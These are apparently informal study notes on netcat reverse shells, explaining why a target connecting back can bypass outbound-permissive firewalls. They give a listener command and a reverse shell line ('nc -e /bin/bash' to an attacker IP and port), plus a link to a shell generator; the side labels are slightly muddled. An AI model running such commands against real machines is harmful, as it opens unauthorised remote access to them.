-> target computer -> network swiss army knife 
-> outside of home network 
-> remote access to the computer 
-> Target connects to us - instead of we connecting to target . to bypass firewall (protects the network )
-> why firewall blocks anything that going in through it . but allows anything going out of it 
-> nc - ie: netcat , need in both device 
things are bit backwords as reverse shell 
-> we need to listen - the conncetion form target 
CMD - nc -lnvp 87 -s ipadress 
l - listining , n - ip adress , v - verbous , p - port s - source 
at attacker - nc -e /bin/bash ipadress port 
https://www.revshells.com/
![[Pasted image 20250604002258.png]] IP - my ip 